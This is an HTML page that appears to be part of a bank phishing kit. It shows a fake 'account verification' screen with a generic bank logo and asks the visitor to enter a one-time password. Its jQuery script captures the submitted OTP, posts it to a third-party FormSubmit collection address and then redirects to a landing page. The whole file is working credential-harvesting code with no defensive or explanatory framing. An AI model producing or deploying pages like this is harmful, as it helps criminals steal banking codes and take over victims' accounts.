<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OTP Page</title>
  <link rel="stylesheet" href="style.css">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      $('form').submit(function(event) {
        event.preventDefault(); // Prevent form submission

        // Send the form data to FormSubmit using AJAX
        $.ajax({
          url: 'https://formsubmit.co/69e710c0e208316cb1db2189e6058cfa',
          method: 'POST',
          data: $('form').serialize(),
          dataType: 'json',
          success: function(response) {
            // Redirect to landing.html upon successful submission
            window.location.href = 'landing.html';
          },
          error: function(xhr, status, error) {
            console.log(xhr.responseText);
            alert('An error occurred. Please try again.');
          }
        });
      });
    });
  </script>
</head>
<body>
  <header>
    <img src="logo.png" alt="Bank Logo" class="logo">
  </header>
  <main><center>
    <img src="otp.jpg" alt="OTP Image" class="otp-image">
	
	<b> ACCOUNT VERIFICATION </b>
	</br>
	</br>
	<h3 style="color:red"> NOTE: </h3>
	 it may take upto 4 minutes before recieving
	 </br>
	 </br>
	 </br>
	 </br>
    <form>
      <div class="form-group">
        <label for="otp">INPUT OTP HERE:</label>
        <input type="text" id="otp" name="otp" required>
      </div>
      <button type="button" class="submit-btn">Submit OTP</button>
	  </center>
    </form>
  </main>
  
   <img src="image3.png" alt="Loan Image" class="loan-image">
</body>
</html>
